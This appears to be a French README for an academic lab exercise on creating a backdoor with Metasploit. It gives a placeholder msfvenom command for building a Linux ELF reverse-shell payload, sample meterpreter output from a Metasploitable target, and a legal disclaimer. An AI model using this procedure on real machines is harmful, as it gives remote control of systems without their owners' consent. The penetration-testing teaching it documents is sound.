# Backdoor expérimental avec Metasploit

## 1. Introduction

- **Objectif** : Démontrer les étapes d’un contrôle d’un système via une backdoor.  
- **Autorisation** : Exercice académique strictement encadré et supervisé.  
- **Outils utilisés** :  
  - msfvenom (version X.Y)  
  - Metasploit Framework  
- **Machine cible** : Ubuntu (architecture x86)

---

## 2. Méthodologie

### Étape 1 : Création du Payload (Backdoor)

- **Outil** : `msfvenom`  
- **Commande type** :  
  ```bash
  msfvenom -p <OS>/<arch>/<payload_type> LHOST=<IP_LOCALE> LPORT=<PORT> -f <format> -o <fichier_sortie>
  ```
  **Description :**

Génération d’un payload adapté à la cible (Ubuntu x86).

Format de sortie : `.elf` (exécutable Linux).

---

### Étape 2 : Mise en place de l’Écouteur (Listener)

**Outil :** Metasploit Framework (`multi/handler`)

**Exemple de commandes :**

```bash
meterpreter > pwd
/home/msfadmin

meterpreter > sysinfo
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

## Avertissement légal

Ce projet est uniquement à des fins éducatives dans un environnement contrôlé.  
Toute utilisation malveillante est strictement interdite et peut entraîner des poursuites judiciaires.

## 👨‍💻 Author

Made with ❤️ by [NgantouJoël]
Contributions and suggestions are welcome!
